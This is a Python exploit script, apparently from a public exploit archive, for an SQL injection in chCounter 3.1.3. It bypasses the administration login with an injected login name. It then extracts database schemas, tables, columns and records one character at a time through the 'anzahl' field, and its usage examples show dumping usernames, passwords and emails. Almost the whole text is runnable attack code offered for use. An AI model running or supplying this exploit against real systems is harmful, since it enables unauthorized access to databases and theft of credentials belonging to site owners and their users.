#!/usr/bin/python
#
# Exploit Title: chCounter <= 3.1.3 SQLInjection
# Date: 2010/11/18
# Author: Matias Fontanini(mfontanini@cert.unlp.edu.ar).
# Software Link: http://chcounter.org/chCounter3/getfile.php?id=5
# Version: 3.1.3
# Tested on: Ubuntu Server 10.04 with apache
#
# Requirements: 
# - Downloads must be enabled(this is not default).
# - magic_quotes off. 
# - Access to administration site(can be bypassed if magic_quotes off)
#
# =SQLInjection=
# Location: administration/index.php?cat=downloads&edit=
# Affected parameters: anzahl
# Method: POST
# Severity: High
# Description: When accessing administration/index.php?cat=downloads&edit=VALID_ID
# and using a valid download id, an attacker is able to manipulate the "anzahl"
# parameter to perform queries which only involve returning an integer. The query
# output will be sent back to the client in the "anzahl" text input.
# Exploit: An attacker could perform repeated crafted requests to retrieve any 
# database records for which the user has access.

import sys
import httplib, urllib
import types

lookupString='name="anzahl" value="'

def generateHeaders(host, sessid):
    headers = {'Host':host,
            'User-Agent':'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.12) Gecko/20101027 Ubuntu/10.10 (maverick) Firefox/3.6.12',
            'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language':'en-us,en;q=0.5',
            'Accept-Encoding':'deflate',
            'Accept-Charset:':'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
            'Keep-Alive':'115',
            'Connection':'keep-alive',
            'Content-Type':'application/x-www-form-urlencoded',
            'Referer':'http://' + host,
            'Cookie':'PHPSESSID='+sessid}
    if sessid == '':
        del headers['Cookie']
    return headers


def loginRequest(connection, sessid, host, path):
    headers = generateHeaders(host, sessid)
    params = urllib.urlencode({'login_form':'1','login_name':'or \'=\'','login_pw':''})
    connection.request('POST', path + 'administration/index.php', params, headers)
    return connection.getresponse()


def generateSessId(connection, host, path):
    headers = generateHeaders(host, '')
    connection.request('GET', path + 'stats/online_users.php', '', headers)
    response = connection.getresponse()
    cookie = response.getheader('Set-Cookie')
    if type(cookie) is types.NoneType:
        print '[-] Could not get session id. Wrong path?'
        exit(2)
    return cookie[10:cookie.find(';')]
    
def genSessid(host, path):
    print '[+] Trying ' + host + path
    con = connectToHost(host)
    sessid = generateSessId(con, host, path)
    print '[+] Acquired PHPSESSID -> ' + sessid
    con = connectToHost(sys.argv[1])
    output = loginRequest(con, sessid, host, path).read()
    if output.find('login_name') != -1:
        print '[-] Could not bypass login'
        exit(7)
    return sessid

def guessLen(sessid, host, field, path, dId, table):
    headers = generateHeaders(host, sessid)
    connection = connectToHost(host)
    params = urllib.urlencode({'dl_id':dId,
                               'name':'test','url':'http://test.com',
                               'wert':'test',
                               'timestamp_eintrag':'2010-11-17, 15:43:00',
                               'timestamp':'2010-11-17, 15:43:00',
                               'edit_download':'Save entry',
                               'anzahl':'(select length(val) from (select '+field+' as val from '+table+') as xYsdS)'})
    connection.request('POST', path + 'administration/index.php?cat=downloads&edit='+str(dId), params, headers)
    response = connection.getresponse().read()
    if response.find('command denied') != -1:
        print '[-] Could not acces table. Acces denied.'
        exit(4)
    index = response.find(lookupString)
    return int(str(response[index+len(lookupString):response.find('"', index+len(lookupString))]))


def guessField(sessid, host, path, dId, field, table):
    sz=guessLen(sessid, host, field, path, dId, table)
    headers = generateHeaders(host, sessid)
    i=1
    while i <= sz: 
        connection = connectToHost(host)
        params = urllib.urlencode({'dl_id':dId,
                                   'name':'test','url':'http://test.com',
                                   'wert':'test',
                                   'timestamp_eintrag':'2010-11-17, 15:43:00',
                                   'timestamp':'2010-11-17, 15:43:00',
                                   'edit_download':'Save entry',
                                   'anzahl':'(select ascii(substring(val,'+str(i)+',1)) from (select '+field+' as val from '+table+') as x)'})
        connection.request('POST', path + 'administration/index.php?cat=downloads&edit='+str(dId), params, headers)
        response = connection.getresponse().read()
        index = response.find(lookupString)
        sys.stdout.write(chr(int(str(response[index+len(lookupString):response.find('"', index+len(lookupString))]))))
        sys.stdout.flush()
        i += 1


def getValidId(sessid, host, path):
    headers = generateHeaders(host, sessid)
    connection = connectToHost(host)
    connection.request('GET', path + 'administration/index.php?cat=downloads', '', headers)
    response = connection.getresponse().read()
    if response.find('ID') == -1:
        print '[-] Downloads seem to be deactivated'
        exit(6)
    index=response.find('index.php?cat=downloads&edit=')
    return int(str(response[index+len('index.php?cat=downloads&edit='):response.find('"', index+len('index.php?cat=downloads&edit='))]))

def getRowCount(sessid, host, path, dId, field, table):
    headers = generateHeaders(host, sessid)
    connection = connectToHost(host)
    params = urllib.urlencode({'dl_id':dId,
                               'name':'test','url':'http://test.com',
                               'wert':'test',
                               'timestamp_eintrag':'2010-11-17, 15:43:00',
                               'timestamp':'2010-11-17, 15:43:00',
                               'edit_download':'Save entry',
                               'anzahl':'(select count(distinct('+field+')) from '+table+')'})
    connection.request('POST', path + 'administration/index.php?cat=downloads&edit='+str(dId), params, headers)
    response = connection.getresponse().read()
    if response.find('command denied') != -1:
        print '[-] Could not acces table. Acces denied.'
        exit(4)
    index = response.find(lookupString)
    return int(str(response[index+len(lookupString):response.find('"', index+len(lookupString))]))

def getSchemas(sessid, host, path, dId):	
    rows=getRowCount(sessid, host, path, dId,'schema_name', 'information_schema.schemata')
    print '[+] Schema count: ' + str(rows)
    for i in range(0, rows):
        sys.stdout.write('[+] Table name: ')
        guessField(sessid, host, path, dId,'schema_name', 'information_schema.schemata limit 1 offset '+str(i))
        print ''

def getTables(sessid, host, path, dId):	
    rows=getRowCount(sessid, host, path, dId,'table_name', 'information_schema.tables')
    print '[+] Table count: ' + str(rows)
    for i in range(0, rows):
        sys.stdout.write('[+] Table name: ')
        guessField(sessid, host, path, dId,'table_name', 'information_schema.tables limit 1 offset '+str(i))
        print ''


def getColumns(sessid, host, path, dId, table):	
    rows=getRowCount(sessid, host, path, dId,'column_name', 'information_schema.columns where table_name = \'' + table + '\'')
    print '[+] Column count: ' + str(rows)
    for i in range(0, rows):
        sys.stdout.write('[+] Column name: ')
        guessField(sessid, host, path, dId,'column_name', 'information_schema.columns where table_name = \'' + table + '\' limit 1 offset '+str(i))
        print ''

def getItems(sessid, host, path, dId, table, columns, orderby):	
    rows=getRowCount(sessid, host, path, dId, columns[0], table)
    print '[+] Item count: ' + str(rows)
    print '[+] Dump:'
    for i in range(0, rows):
        for col in columns:
            if len(orderby):
                sys.stdout.write(' || ')
                guessField(sessid, host, path, dId, col, table+' order by ' + orderby + ' limit 1 offset '+str(i))
            else:
                sys.stdout.write(' || ')
                guessField(sessid, host, path, dId, col, table+' limit 1 offset '+str(i))
        print ' || '

def connectToHost(host):
    con = httplib.HTTPConnection(sys.argv[1], 80)
    tries=5
    recon=True
    while tries > 0 and recon == True:
        try:
            con.connect();
            recon = False
        except:
            tries -= 1
    if tries == 0:
        print '[-] Could not establish connection'
        exit(3)
    return con

def printHelp():
    print '[-] Usage ' + sys.argv[0] + ' <WEBSERVER> <PATH_TO_CHCOUNTER> <OPTION> [ARGS]'
    print '    OPTION can be:'
    print '                    -t to list all tables'
    print '                    -c <TABLE> to list all columns from table TABLE'
    print '                    -s <TABLE> to list all columns from table TABLE'
    print '                    -i <TABLE> <COLUMNS*> [ORDERBY] to list TABLE:COLUMN items.'
    print '                         COLUMNS* can be a comma-separated list of columns'
    print ''
    print '   Examples:'
    print '   ' + sys.argv[0] + ' www.vulnerable.com /chCounter/ -t'
    print '   ' + sys.argv[0] + ' www.vulnerable.com /chCounter/ -s'
    print '   ' + sys.argv[0] + ' www.vulnerable.com /chCounter/ -c users'
    print '   ' + sys.argv[0] + ' www.vulnerable.com /chCounter/ -i users username,passwd,email'
    print '   ' + sys.argv[0] + ' www.vulnerable.com /chCounter/ -i users username user_id'
    print '                       The last example outputs result ordered by user_id'
    exit(1)

if len(sys.argv) < 4:
    printHelp()

sessid = genSessid(sys.argv[1], sys.argv[2])
valId = getValidId(sessid, sys.argv[1], sys.argv[2])

if sys.argv[3] == '-t':
    getTables(sessid, sys.argv[1], sys.argv[2], valId)
    exit(0)
if sys.argv[3] == '-c':
    if len(sys.argv) < 5:
        printHelp()
    getColumns(sessid, sys.argv[1], sys.argv[2], valId, sys.argv[4])
    exit(0)
if sys.argv[3] == '-i':
    if len(sys.argv) < 6:
        printHelp()
    orderby=''
    if len(sys.argv) == 7:
        orderby = sys.argv[6]
        orderby = sys.argv[6]
    getItems(sessid, sys.argv[1], sys.argv[2], valId, sys.argv[4], sys.argv[5].split(','), orderby)
    exit(0)
if sys.argv[3] == '-s':
    if len(sys.argv) < 4:
        printHelp()
    getSchemas(sessid, sys.argv[1], sys.argv[2], valId)
    exit(0)